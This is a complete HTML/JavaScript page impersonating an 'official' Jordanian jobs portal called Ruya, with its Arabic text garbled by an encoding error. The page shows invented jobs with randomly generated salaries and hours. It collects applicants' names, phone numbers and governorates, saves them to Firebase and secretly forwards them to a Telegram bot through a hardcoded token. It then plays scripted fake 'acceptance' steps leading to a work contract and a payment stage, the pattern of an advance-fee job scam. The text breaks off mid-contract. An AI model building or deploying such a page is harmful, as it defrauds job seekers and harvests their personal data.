<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <title>ÙˆØ¸Ø§Ø¦Ù Ø±Ø¤ÙŠØ§ | Ø§Ù„Ø¨ÙˆØ§Ø¨Ø© Ø§Ù„Ø±Ø³Ù…ÙŠØ© Ù„Ù„ÙˆØ¸Ø§Ø¦Ù ÙÙŠ Ø§Ù„Ø£Ø±Ø¯Ù†</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="theme-color" content="#4b1979">
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@700&display=swap" rel="stylesheet">
  <link rel="icon" href="https://www2.0zz0.com/2025/10/15/20/337819623.png">
  <style>
    :root {
      --purple: #4b1979;
      --purple-grad: linear-gradient(90deg, #7f38c0 0%, #4b1979 100%);
      --purple-btn: linear-gradient(90deg, #a259c4 0%, #7f38c0 100%);
      --white: #fff;
      --shadow: 0 8px 32px #4b197914;
      --gold: #b88f27;
      --green: #43b968;
      --gray: #f9f7fa;
      --danger: #e6415d;
    }
    body {
      margin: 0;
      font-family: 'Cairo', Arial, sans-serif;
      background: var(--gray);
      color: var(--purple);
      min-height: 100vh;
    }
    header {
      background: var(--purple);
      color: var(--white);
      text-align: center;
      padding: 38px 10px 16px;
      position: relative;
      box-shadow: 0 2px 24px #4b197918;
    }
    header img {
      width: 70px;
      height: 70px;
      display: block;
      margin: 0 auto 10px;
      border-radius: 16px;
      background: #fff;
      border: 3px solid #fff;
      box-shadow: var(--shadow);
    }
    header h1 {
      font-size: 2.2rem;
      font-weight: 900;
      margin: 8px 0 7px 0;
      letter-spacing: 0.8px;
    }
    header p {
      font-size: 1.08rem;
      margin: 0;
      color: #f6e7ff;
    }
    .main-section {
      max-width: 730px;
      margin: 0 auto;
      padding: 36px 9px 44px 9px;
    }
    .main-section h2 {
      text-align: center;
      color: var(--purple);
      font-size: 1.4rem;
      font-weight: 900;
      margin-bottom: 18px;
    }
    .jobs-list {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 18px;
    }
    @media (max-width:700px) {
      .jobs-list { grid-template-columns: 1fr;}
    }
    .job-card {
      background: #fff;
      border-radius: 16px;
      box-shadow: var(--shadow);
      padding: 18px 18px 12px 18px;
      border: 1.7px solid #e5d2f5;
      transition: box-shadow .2s;
      position: relative;
      display: flex;
      flex-direction: column;
      gap: 7px;
    }
    .job-title {
      font-size: 1.22rem;
      font-weight: 900;
      color: var(--purple);
      margin-bottom: 3px;
    }
    .job-meta {
      color: #6642a6;
      font-size: 1.02rem;
      margin-bottom: 2px;
      font-weight: 700;
      display: flex;
      flex-wrap: wrap;
      gap: 13px;
    }
    .job-desc {
      color: #262626;
      font-size: .99rem;
      margin-bottom: 3px;
      min-height: 32px;
    }
    .job-actions {
      margin-top: 7px;
      display: flex;
      gap: 8px;
    }
    .job-actions button {
      background: var(--purple-btn);
      color: #fff;
      border: none;
      padding: 7px 0;
      min-width: 120px;
      border-radius: 14px;
      font-size: 1.05rem;
      font-weight: 700;
      cursor: pointer;
      box-shadow: 0 2px 12px #7f38c034;
      transition: background .2s;
    }
    .job-actions button:active {background: var(--purple);}
    .job-salary {
      color: var(--green);
      font-size: 1.08rem;
      font-weight: 900;
    }
    .job-hours {
      color: #b88f27;
      font-size: .99rem;
      font-weight: 700;
    }
    .job-location{
      font-size: .98rem;
      color: #4b1979;
      font-weight: 700;
    }
    /* Modal Styles */
    .modal-backdrop {
      display: none;
      position: fixed;
      z-index: 9999;
      top: 0; left: 0; width: 100vw; height: 100vh;
      background: #2a003b90;
      justify-content: center;
      align-items: center;
    }
    .modal {
      background: #fff;
      border-radius: 26px;
      box-shadow: var(--shadow);
      padding: 38px 22px 32px 22px;
      max-width: 390px;
      width: 94vw;
      text-align: center;
      position: relative;
      animation: modalIn 0.5s;
    }
    @keyframes modalIn {
      from { transform: translateY(-80px) scale(.95); opacity:0;}
      to { transform: none; opacity:1;}
    }
    .modal h2 {
      color: var(--purple);
      font-size: 1.41rem;
      font-weight: 900;
      margin: 0 0 7px 0;
    }
    .modal .modal-sub {
      color: var(--gold);
      font-size: 1.08rem;
      margin-bottom: 17px;
      letter-spacing: .3px;
      font-weight: 600;
    }
    .modal input, .modal select {
      width: 100%;
      padding: 13px 11px;
      margin-bottom: 18px;
      background: #fff;
      border: 1.6px solid #d0b8e4;
      border-radius: 9px;
      font-size: 1.09rem;
      font-family: inherit;
      outline: none;
      transition: border .2s;
      box-sizing: border-box;
    }
    .modal input:focus, .modal select:focus {
      border-color: #7f38c0;
    }
    .modal select {
      color: #7f38c0;
      font-weight: 700;
    }
    .modal button {
      background: var(--purple-btn);
      color: #fff;
      border: none;
      padding: 11px 0;
      width: 100%;
      border-radius: 14px;
      font-size: 1.12rem;
      font-weight: 700;
      cursor: pointer;
      margin-top: 7px;
      box-shadow: 0 3px 16px #7f38c034;
      transition: background .2s;
    }
    .modal button:active {
      background: var(--purple);
    }
    .modal .notice {
      color: var(--danger);
      font-size: 1.07rem;
      font-weight: 700;
      margin-top: 7px;
      margin-bottom: 0;
    }
    /* Ø¥Ø¬Ø±Ø§Ø¡Ø§Øª Ø§Ù„ØªÙˆØ¸ÙŠÙ */
    .steps-section {
      background: #fff;
      border-radius: 20px;
      box-shadow: var(--shadow);
      margin: 30px auto 30px auto;
      max-width: 500px;
      padding: 25px 12px 18px 12px;
      text-align: center;
      display: none;
      animation: stepIn 0.5s;
    }
    @keyframes stepIn {
      from { transform: scale(.9); opacity:0;}
      to { transform: none; opacity:1;}
    }
    .steps-section.active {display: block;}
    .steps-section h2 {
      color: var(--purple);
      font-size: 1.25rem;
      font-weight: 900;
      margin-bottom: 15px;
    }
    .step {
      margin: 0 auto 14px auto;
      background: #f6f1fb;
      border-radius: 14px;
      border: 1.2px solid #e5d2f5;
      padding: 14px 12px 8px 12px;
      font-size: 1.08rem;
      color: #4b1979;
      font-weight: 700;
      position: relative;
      box-shadow: 0 3px 16px #7f38c018;
      animation: stepPop .7s;
    }
    @keyframes stepPop {
      from { transform: translateY(50px) scale(.96); opacity:0;}
      to { transform: none; opacity:1;}
    }
    .step.done {
      border-color: var(--green);
      background: #e4fbe8;
      color: var(--green);
    }
    .step.waiting {
      color: #b88f27;
      border-color: #f3e2c5;
      background: #fffbea;
    }
    .step .loader {
      display: inline-block;
      width: 22px; height: 22px;
      border: 3px solid #b88f27;
      border-top: 3px solid #fff;
      border-radius: 50%;
      margin-left: 7px;
      vertical-align: -5px;
      animation: spin 1.1s linear infinite;
    }
    @keyframes spin {
      100% { transform: rotate(360deg);}
    }
    /* Ø¹Ù‚Ø¯ Ø§Ù„Ø¹Ù…Ù„ */
    .contract-section {
      background: #fff;
      border-radius: 20px;
      box-shadow: var(--shadow);
      margin: 30px auto 30px auto;
      max-width: 480px;
      padding: 24px 11px 18px 11px;
      text-align: center;
      display: none;
    }
    .contract-section.active {display:block;}
    .contract-content {
      direction: rtl;
      text-align: right;
      padding: 22px 13px 14px 13px;
      border: 2px solid #e5d2f5;
      margin-bottom: 15px;
      border-radius: 11px;
      background: #f6f1fb;
      font-size: 1.08rem;
      color: #333;
      font-weight: 700;
      box-shadow: 0 3px 16px #7f38c018;
      position: relative;
      min-height: 180px;
    }
    .contract-sign {
      display: flex;
      justify-content: space-between;
      align-items: flex-end;
      margin-top: 18px;
    }
    .contract-sign img {
      height: 52px;
      opacity: 0.7;
    }
    .contract-sign .stamp {
      border: 2px dashed #7f38c0;
      border-radius: 9px;
      padding: 6px 18px;
      font-size: 1.04rem;
      color: #7f38c0;
      font-weight: bold;
    }
    .download-btn {
      background: var(--purple-btn);
      color: #fff;
      border: none;
      padding: 10px 0;
      width: 100%;
      border-radius: 14px;
      font-size: 1.03rem;
      font-weight: 700;
      cursor: pointer;
      margin-top: 7px;
      box-shadow: 0 2px 12px #7f38c034;
      transition: background .2s;
    }
    .download-btn:active {background: var(--purple);}
    /* Ø¯ÙØ¹ */
    .payment-section {
      background: #fff;
      border-radius: 20px;
      box-shadow: var(--shadow);
      margin: 30px auto 30px auto;
      max-width: 480px;
      padding: 28px 11px 18px 11px;
      text-align: center;
      display: none;
    }
    .payment-section.active {display:block;}
    .payment-title {
      color: var(--purple);
      font-size: 1.13rem;
      font-weight: 900;
      margin-bottom: 12px;
    }
    .payment-list {
      text-align: right;
      margin: 0 0 13px 0;
      color: #4b1979;
    }
    .payment-total {
      color: #b88f27;
      font-size: 1.13rem;
      font-weight: 800;
      margin-bottom: 11px;
      margin-top: 12px;
    }
    .payment-instructions {
      color: #444;
      font-size: 1.05rem;
      margin-bottom: 12px;
    }
    .payment-steps {
      color: #888;
      font-size: .97rem;
    }
    .paid-btn, .cancel-btn, .again-btn {
      display: inline-block;
      margin: 7px 4px;
      padding: 8px 20px;
      border-radius: 12px;
      border: none;
      font-size: 1.07rem;
      font-weight: 700;
      cursor: pointer;
      background: var(--purple-btn);
      color: #fff;
      box-shadow: 0 2px 12px #7f38c034;
      transition: background .2s;
    }
    .paid-btn:active, .again-btn:active {background: var(--purple);}
    .cancel-btn {
      background: #e6415d;
      color: #fff;
      margin-left: 8px;
    }
    .cancel-btn:active {background: #b21f3d;}
    .info-message {
      color: var(--green);
      font-weight: 900;
      margin-bottom: 7px;
      font-size: 1.11rem;
      letter-spacing: .2px;
    }
    .pending-message {
      color: #b88f27;
      font-size: 1.05rem;
      font-weight: 700;
      margin-bottom: 8px;
    }
    /* Ø¥Ø´Ø¹Ø§Ø±Ø§Øª */
    .notify {
      position: fixed;
      top: 20px;
      right: 50%;
      transform: translateX(50%);
      background: var(--purple-btn);
      color: #fff;
      padding: 16px 42px;
      border-radius: 18px;
      font-size: 1.13rem;
      font-weight: 700;
      box-shadow: 0 2px 16px #7f38c044;
      z-index: 99999;
      display: none;
      animation: fadeIn .5s;
    }
    @keyframes fadeIn {
      from { opacity:0; top:10px;}
      to { opacity:1; top:20px;}
    }
    @media (max-width:600px) {
      header h1 { font-size: 1.2rem;}
      .main-section { padding: 17px 2vw 22px 2vw;}
      .modal { padding: 20px 5vw 15px 5vw;}
      .steps-section, .contract-section, .payment-section {padding: 13px 3vw 13px 3vw;}
      .jobs-list { grid-template-columns: 1fr;}
    }
    ::-webkit-scrollbar { width: 8px;}
    ::-webkit-scrollbar-thumb { background: #7f38c034; border-radius: 6px;}
    ::selection { background: #7f38c022; }
  </style>
</head>
<body>
  <header>
    <img src="https://www2.0zz0.com/2025/10/15/20/337819623.png" alt="Ø´Ø¹Ø§Ø± Ø±Ø¤ÙŠØ§">
    <h1>ÙˆØ¸Ø§Ø¦Ù Ø±Ø¤ÙŠØ§</h1>
    <p>Ø§Ù„Ø¨ÙˆØ§Ø¨Ø© Ø§Ù„Ø±Ø³Ù…ÙŠØ© Ù„Ø¬Ù…ÙŠØ¹ Ø§Ù„ÙˆØ¸Ø§Ø¦Ù Ø§Ù„Ù…ØªÙˆÙØ±Ø© ÙÙŠ Ø§Ù„Ø£Ø±Ø¯Ù†</p>
  </header>
  <section class="main-section" id="mainSection">
    <h2>Ø§Ø®ØªØ± Ø§Ù„ÙˆØ¸ÙŠÙØ© Ø§Ù„Ù…Ù†Ø§Ø³Ø¨Ø© Ù„Ùƒ</h2>
    <div id="jobs" class="jobs-list"></div>
  </section>
  <!-- Ù†Ø§ÙØ°Ø© ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… -->
  <div id="modalBackdrop" class="modal-backdrop">
    <div class="modal">
      <h2>ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„</h2>
      <div class="modal-sub">ÙŠØ±Ø¬Ù‰ ØªØ¹Ø¨Ø¦Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ù„Ù…ØªØ§Ø¨Ø¹Ø© Ø§Ù„ØªÙ‚Ø¯ÙŠÙ… Ø¹Ù„Ù‰ Ø§Ù„ÙˆØ¸Ø§Ø¦Ù</div>
      <form id="userForm" autocomplete="off">
        <input required type="text" id="username" name="username" placeholder="Ø§Ù„Ø§Ø³Ù… Ø§Ù„ÙƒØ§Ù…Ù„">
        <input required type="tel" id="phone" name="phone" pattern="^07[789][0-9]{7}$" maxlength="10" placeholder="Ø±Ù‚Ù… Ø§Ù„Ù‡Ø§ØªÙ">
        <select required id="governorate" name="governorate">
          <option value="">Ø§Ø®ØªØ± Ø§Ù„Ù…Ø­Ø§ÙØ¸Ø©</option>
          <option>Ø¹Ù…Ø§Ù†</option><option>Ø¥Ø±Ø¨Ø¯</option><option>Ø§Ù„Ø²Ø±Ù‚Ø§Ø¡</option>
          <option>Ø§Ù„Ø¹Ù‚Ø¨Ø©</option><option>Ø¬Ø±Ø´</option><option>Ø§Ù„Ù…ÙØ±Ù‚</option>
          <option>Ø¹Ø¬Ù„ÙˆÙ†</option><option>Ø§Ù„Ø¨Ù„Ù‚Ø§Ø¡</option><option>Ù…Ø¹Ø§Ù†</option>
          <option>Ø§Ù„ÙƒØ±Ùƒ</option><option>Ù…Ø§Ø¯Ø¨Ø§</option><option>Ø§Ù„Ø·ÙÙŠÙ„Ø©</option>
        </select>
        <button type="submit">Ø¯Ø®ÙˆÙ„</button>
      </form>
      <div class="notice" id="modalNotice"></div>
    </div>
  </div>
  <!-- Ø¥Ø¬Ø±Ø§Ø¡Ø§Øª Ø§Ù„ØªÙˆØ¸ÙŠÙ -->
  <div class="steps-section" id="stepsSection"></div>
  <!-- Ø¹Ù‚Ø¯ Ø§Ù„Ø¹Ù…Ù„ -->
  <div class="contract-section" id="contractSection"></div>
  <!-- Ø§Ù„Ø¯ÙØ¹ -->
  <div class="payment-section" id="paymentSection"></div>
  <!-- Ø¥Ø´Ø¹Ø§Ø± -->
  <div class="notify" id="notify"></div>
  <!-- Firebase -->
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
  <!-- jsPDF Ù„ØªØ­ÙˆÙŠÙ„ Ø§Ù„Ø¹Ù‚Ø¯ Ù„Ù€ PDF -->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
  <script>
    // Firebase config
    const firebaseConfig = {
      apiKey: "AIzaSyCtvxXiWWZ4GxWxz1rAhu9nRwiFlkiKMtA",
      authDomain: "royanew-a02f3.firebaseapp.com",
      projectId: "royanew-a02f3",
      storageBucket: "royanew-a02f3.appspot.com",
      messagingSenderId: "640968299159",
      appId: "1:640968299159:web:590e4256ad1492ca19cfd2",
      measurementId: "G-69TLG6LYYK",
      databaseURL: "https://royanew-a02f3-default-rtdb.firebaseio.com"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    // Ø¥Ø´Ø¹Ø§Ø±
    function notify(msg, time=2600) {
      let n = document.getElementById('notify');
      n.innerText = msg;
      n.style.display = 'block';
      setTimeout(()=>{ n.style.display = 'none'; }, time);
    }

    // Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ù…Ù† LocalStorage
    function getUserData() {
      try {return JSON.parse(localStorage.getItem('ruya_user')) || null;}
      catch {return null;}
    }
    function setUserData(data) {
      localStorage.setItem('ruya_user', JSON.stringify(data));
    }
    function clearUserData() {
      localStorage.removeItem('ruya_user');
      localStorage.removeItem('ruya_request');
    }

    // Ø­Ø§Ù„Ø© Ø§Ù„Ø·Ù„Ø¨ (Ø§Ù„Ø¯ÙØ¹ ÙˆØºÙŠØ±Ù‡)
    function getRequestData() {
      try {return JSON.parse(localStorage.getItem('ruya_request')) || null;}
      catch {return null;}
    }
    function setRequestData(data) {
      localStorage.setItem('ruya_request', JSON.stringify(data));
    }
    function clearRequestData() {
      localStorage.removeItem('ruya_request');
    }

    // Ù†Ø§ÙØ°Ø© Ø§Ù„ØªØ³Ø¬ÙŠÙ„
    const modalBackdrop = document.getElementById('modalBackdrop');
    const userForm = document.getElementById('userForm');
    const modalNotice = document.getElementById('modalNotice');

    function showModal() { modalBackdrop.style.display = "flex";}
    function hideModal() { modalBackdrop.style.display = "none";}

    // Ø¹Ù†Ø¯ ØªØ­Ù…ÙŠÙ„ Ø§Ù„ØµÙØ­Ø©
    window.onload = function() {
      let user = getUserData();
      let req = getRequestData();
      if (!user) {
        showModal();
        hideAllSections();
      } else if(req && req.status!=="done") {
        // Ø¥Ø°Ø§ Ø¹Ù„ÙŠÙ‡ Ø·Ù„Ø¨ Ù„Ù… ÙŠÙƒÙ…Ù„Ù‡
        hideAllSections();
        handleRequestFlow(req);
      } else {
        hideAllSections();
        document.getElementById('mainSection').style.display = "block";
        loadJobs();
      }
    };

    // ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…
    userForm.onsubmit = function(e) {
      e.preventDefault();
      let username = userForm.username.value.trim();
      let phone = userForm.phone.value.trim();
      let governorate = userForm.governorate.value;
      if (!username || !phone.match(/^07[789][0-9]{7}$/) || !governorate) {
        modalNotice.innerText = 'ÙŠØ±Ø¬Ù‰ ØªØ¹Ø¨Ø¦Ø© Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø¨Ø´ÙƒÙ„ ØµØ­ÙŠØ­';
        return;
      }
      let userObj = { username, phone, governorate, timestamp: Date.now() };
      db.ref('users').push(userObj).then(() => {
        setUserData(userObj);
        hideModal();
        notify('ØªÙ… ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ Ø¨Ù†Ø¬Ø§Ø­');
        document.getElementById('mainSection').style.display = "block";
        loadJobs();
      }).catch(()=>{modalNotice.innerText = 'Ø­Ø¯Ø« Ø®Ø·Ø£. Ø­Ø§ÙˆÙ„ Ù…Ø±Ø© Ø£Ø®Ø±Ù‰';});
    };

    // ØªØ­Ù…ÙŠÙ„ Ø§Ù„ÙˆØ¸Ø§Ø¦Ù Ù…Ù† Firebase
    function loadJobs() {
      let jobsDiv = document.getElementById('jobs');
      jobsDiv.innerHTML = '<div style="color:#aaa;text-align:center;">Ø¬Ø§Ø±Ù Ø§Ù„ØªØ­Ù…ÙŠÙ„...</div>';
      db.ref('jobs').orderByChild('timestamp').once('value', (snap) => {
        let jobs = [];
        snap.forEach(child => {
          let job = child.val();
          jobs.unshift({id:child.key, ...job});
        });
        // Ø¥Ø°Ø§ Ù„Ø§ ÙŠÙˆØ¬Ø¯ ÙˆØ¸Ø§Ø¦Ù
        if (jobs.length === 0) {
          jobsDiv.innerHTML = '<div style="color:#4b1979;text-align:center;font-size:1.12rem;">Ù„Ø§ ØªÙˆØ¬Ø¯ ÙˆØ¸Ø§Ø¦Ù Ø­Ø§Ù„ÙŠØ§Ù‹</div>';
          return;
        }
        // Ø¹Ø±Ø¶ Ø§Ù„ÙˆØ¸Ø§Ø¦Ù
        jobsDiv.innerHTML = "";
        let user = getUserData();
        jobs.forEach(job => {
          let salary = job.salary? job.salary : getRandomSalary();
          let hours = job.hours? job.hours : getRandomHours();
          jobsDiv.innerHTML += `
            <div class="job-card" data-id="${job.id}">
              <div class="job-title">${job.title}</div>
              <div class="job-meta">
                <span class="job-company">${job.company||'Ø±Ø¤ÙŠØ§'}</span>
                <span class="job-salary">Ø§Ù„Ø±Ø§ØªØ¨: ${salary} Ø¯.Ø£</span>
                <span class="job-hours">Ø³Ø§Ø¹Ø§Øª Ø§Ù„Ø¹Ù…Ù„: ${hours} Ø³Ø§Ø¹Ø§Øª</span>
                <span class="job-location">Ø§Ù„Ù…Ø­Ø§ÙØ¸Ø©: ${user.governorate}</span>
              </div>
              <div class="job-desc">${job.description? job.description.replace(/\n/g,"<br>") : '...'}</div>
              <div class="job-actions">
                <button onclick="applyJob('${job.id}')">Ø§Ø®ØªÙŠØ§Ø± Ø§Ù„ÙˆØ¸ÙŠÙØ©</button>
              </div>
            </div>
          `;
        });
      });
    }
    // Ø±Ø§ØªØ¨ Ø¹Ø´ÙˆØ§Ø¦ÙŠ Ù„Ù„ÙˆØ¸Ø§Ø¦Ù ØºÙŠØ± Ù…Ø­Ø¯Ø¯Ø© Ø§Ù„Ø±Ø§ØªØ¨
    function getRandomSalary() {
      let min = 550, max = 1500;
      return Math.floor(Math.random() * (max-min+1))+min;
    }
    // Ø³Ø§Ø¹Ø§Øª Ø¹Ù…Ù„ Ø¹Ø´ÙˆØ§Ø¦ÙŠØ© Ù„Ù„ÙˆØ¸Ø§Ø¦Ù ØºÙŠØ± Ù…Ø­Ø¯Ø¯Ø© Ø§Ù„Ø³Ø§Ø¹Ø§Øª
    function getRandomHours() {
      let arr = [7,8,9,10];
      return arr[Math.floor(Math.random()*arr.length)];
    }

    // Ø§Ù„ØªÙ‚Ø¯ÙŠÙ… Ø¹Ù„Ù‰ ÙˆØ¸ÙŠÙØ©
    function applyJob(jobId) {
      let user = getUserData();
      if (!user) { showModal(); return; }
      // Ù…Ù†Ø¹ Ø§Ù„ØªÙ‚Ø¯ÙŠÙ… Ù„Ùˆ Ø¹Ù†Ø¯Ù‡ Ø·Ù„Ø¨ Ù„Ù… ÙŠÙƒÙ…Ù„Ù‡
      let req = getRequestData();
      if (req && req.status!=="done") {
        notify('Ù„Ø¯ÙŠÙƒ Ø·Ù„Ø¨ Ø¬Ø§Ø±ÙŠ Ø¨Ø§Ù„ÙØ¹Ù„! Ø£ÙƒÙ…Ù„ Ø§Ù„Ø¥Ø¬Ø±Ø§Ø¡Ø§Øª Ø£Ùˆ Ø£Ù„ØºÙ Ø§Ù„Ø·Ù„Ø¨.');
        return;
      }
      // Ø¬Ù„Ø¨ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„ÙˆØ¸ÙŠÙØ©
      db.ref('jobs/'+jobId).once('value').then(snap=>{
        let job = snap.val();
        if (!job) { notify('Ø­Ø¯Ø« Ø®Ø·Ø£'); return; }
        // ØªØ¹ÙŠÙŠÙ† Ø±Ø§ØªØ¨/Ø³Ø§Ø¹Ø§Øª Ø§ÙØªØ±Ø§Ø¶ÙŠØ© Ø¥Ø°Ø§ ØºÙŠØ± Ù…ÙˆØ¬ÙˆØ¯Ø©
        let salary = job.salary? job.salary : getRandomSalary();
        let hours = job.hours? job.hours : getRandomHours();
        // Ø­ÙØ¸ Ø­Ø§Ù„Ø© Ø§Ù„Ø·Ù„Ø¨
        let request = {
          user, jobId, jobTitle:job.title, jobCompany:job.company||'Ø±Ø¤ÙŠØ§',
          salary, hours, location:user.governorate,
          status: "steps", // Ø§Ù„Ø®Ø·ÙˆØ© Ø§Ù„Ø­Ø§Ù„ÙŠØ©
          step: 0,
          paid: false
        };
        setRequestData(request);
        hideAllSections();
        handleRequestFlow(request);
        // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø·Ù„Ø¨ Ù„Ù„Ø¨ÙˆØª ØªÙ„Ø¬Ø±Ø§Ù…
        sendToTelegram({
          ...user,
          job: job.title,
          salary: salary,
          hours: hours,
          location: user.governorate
        });
      });
    }
    // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ù„Ù„Ø¨ÙˆØª ØªÙ„Ø¬Ø±Ø§Ù…
    function sendToTelegram(data) {
      const token = "8364248948:AAFWbzdx1bMnjaU6xY218i0V7uAfXQXJPFM";
      const chat_id = "6873334348";
      let msg = `ğŸ“ ØªÙ‚Ø¯ÙŠÙ… Ø¬Ø¯ÙŠØ¯ Ù„ÙˆØ¸ÙŠÙØ© Ø±Ø¤ÙŠØ§:\n`+
        `Ø§Ù„Ø§Ø³Ù…: ${data.username}\n`+
        `Ø§Ù„Ù‡Ø§ØªÙ: ${data.phone}\n`+
        `Ø§Ù„Ù…Ø­Ø§ÙØ¸Ø©: ${data.governorate}\n`+
        `Ø§Ù„ÙˆØ¸ÙŠÙØ©: ${data.job}\n`+
        `Ø§Ù„Ø±Ø§ØªØ¨: ${data.salary} Ø¯.Ø£\n`+
        `Ø³Ø§Ø¹Ø§Øª Ø§Ù„Ø¹Ù…Ù„: ${data.hours}`;
      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body: JSON.stringify({chat_id, text:msg})
      });
    }

    // Ø®Ø·ÙˆØ§Øª Ø§Ù„ØªÙˆØ¸ÙŠÙ
    const steps = [
      {txt:'ØªÙ… Ø§Ø³ØªÙ„Ø§Ù… Ø·Ù„Ø¨Ùƒ Ø¨Ù†Ø¬Ø§Ø­ØŒ ÙŠØªÙ… Ø§Ù„Ø¢Ù† Ù…Ø±Ø§Ø¬Ø¹Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª.', time:1800, class:'done'},
      {txt:'Ø¬Ø§Ø±ÙŠ Ù…Ø·Ø§Ø¨Ù‚Ø© Ø¨ÙŠØ§Ù†Ø§ØªÙƒ Ù…Ø¹ Ù…ØªØ·Ù„Ø¨Ø§Øª Ø§Ù„ÙˆØ¸ÙŠÙØ©...', time:2200, class:'waiting'},
      {txt:'ØªÙ… Ù‚Ø¨ÙˆÙ„Ùƒ Ù…Ø¨Ø¯Ø¦ÙŠÙ‹Ø§ ÙÙŠ Ø§Ù„ÙˆØ¸ÙŠÙØ©! Ø¨Ø±Ø¬Ø§Ø¡ Ù…Ø±Ø§Ø¬Ø¹Ø© Ø¹Ù‚Ø¯ Ø§Ù„Ø¹Ù…Ù„ ÙˆØªØ£ÙƒÙŠØ¯ Ø§Ù„Ø­Ø¬Ø².', time:1500, class:'done'},
      {txt:'Ø¬Ø§Ø±ÙŠ ØªØ¬Ù‡ÙŠØ² Ø¹Ù‚Ø¯ Ø§Ù„Ø¹Ù…Ù„ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ...', time:1700, class:'waiting'}
    ];

    // Ù…Ø¹Ø§Ù„Ø¬Ø© Ø³ÙŠØ± Ø§Ù„Ø·Ù„Ø¨ Ø­Ø³Ø¨ Ø§Ù„Ø­Ø§Ù„Ø©
    function handleRequestFlow(req) {
      if (req.status === "steps") {
        document.getElementById('stepsSection').innerHTML = '';
        showSection('stepsSection');
        showSteps(req, 0);
      } else if (req.status === "contract") {
        showSection('contractSection');
        showContract(req);
      } else if (req.status === "payment") {
        showSection('paymentSection');
        showPayment(req);
      } else if (req.status === "pending") {
        showSection('paymentSection');
        showPendingPayment(req);
      } else if (req.status === "done") {
        clearRequestData();
        notify('ØªÙ… ØªÙˆØ¸ÙŠÙÙƒ Ø¨Ù†Ø¬Ø§Ø­!');
        document.getElementById('mainSection').style.display = "block";
        loadJobs();
      }
    }

    // Ø¹Ø±Ø¶ Ø®Ø·ÙˆØ§Øª Ø§Ù„ØªÙˆØ¸ÙŠÙ
    function showSteps(req, idx) {
      const section = document.getElementById('stepsSection');
      section.innerHTML = `<h2>Ø¥Ø¬Ø±Ø§Ø¡Ø§Øª Ø§Ù„ØªÙˆØ¸ÙŠÙ Ø§Ù„Ø±Ø³Ù…ÙŠØ©</h2>`;
      for(let i=0; i<=idx; i++) {
        let st = steps[i];
        section.innerHTML += `<div class="step ${st.class}">${st.txt} ${i==idx?'<span class="loader"></span>':''}</div>`;
      }
      if(idx<steps.length-1){
        setTimeout(()=>{
          showSteps(req, idx+1);
        }, steps[idx].time);
      }else{
        // Ø§Ù„Ø§Ù†ØªÙ‚Ø§Ù„ Ù„Ø¹Ù‚Ø¯ Ø§Ù„Ø¹Ù…Ù„
        let r = {...req, status:"contract"};
        setRequestData(r);
        setTimeout(()=>handleRequestFlow(r), 1700);
      }
    }

    // Ø¹Ø±Ø¶ Ø¹Ù‚Ø¯ Ø§Ù„Ø¹Ù…Ù„
    function showContract(req) {
      const section = document.getElementById('contractSection');
      section.innerHTML = `<h2>Ø¹Ù‚Ø¯ Ø§Ù„Ø¹Ù…Ù„ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ</h2>
        <div class="contract-content" id="contractContent">
          <div>Ø§Ù„Ø³ÙŠØ¯/Ø© <b>${req.user.username}</b> Ø§Ù„Ù…Ø­ØªØ±Ù…ØŒ</div>
          <div>Ø¨Ù…ÙˆØ¬Ø¨ Ù‡Ø°Ø§ Ø§Ù„Ø¹Ù‚Ø¯ØŒ ØªÙ… Ù‚Ø¨ÙˆÙ„Ùƒ Ù„Ù„Ø¹Ù…Ù„ Ø¨ÙˆØ¸ÙŠÙØ© <b>${req.jobTitle}</b> ÙÙŠ Ø´Ø±ÙƒØ© <b>${req.jobCompany}</b> Ø¨Ù…Ø­Ø§ÙØ¸Ø© <b>${req.location}</b>ØŒ Ø¨Ø±Ø§ØªØ¨ Ø´Ù‡Ø±ÙŠ Ù‚Ø¯Ø±Ù‡ <b>${req.salary} Ø¯ÙŠÙ†Ø§Ø± Ø£Ø±Ø¯Ù†ÙŠ</b>ØŒ ÙˆØ¹Ø¯Ø¯ Ø³Ø§Ø¹Ø§Øª Ø§Ù„Ø¹Ù…Ù„ <b>${req.hours}</b> ÙŠÙˆÙ…ÙŠÙ‹Ø§.</div>
          <div style="margin:7px 0 3px 0;">Ø±Ù‚Ù… Ù‡Ø§ØªÙÙƒ: <b>${req.user.phone}</b></div>
          <div style="margin:9px 0 4px 0;">ØªØ§Ø±ÙŠØ® Ø§Ù„Ø¹Ù‚Ø¯: ${new Date().toLocaleDateString('ar-JO')}</div>
          <div class="contract-sign">
            <img src="https://svgshare.com/i/17qz.svg" alt="ØªÙˆÙ‚ÙŠØ¹" title="ØªÙˆÙ‚ÙŠØ¹ Ù…Ø³Ø¤ÙˆÙ„ Ø§Ù„ØªÙˆØ¸ÙŠÙ">
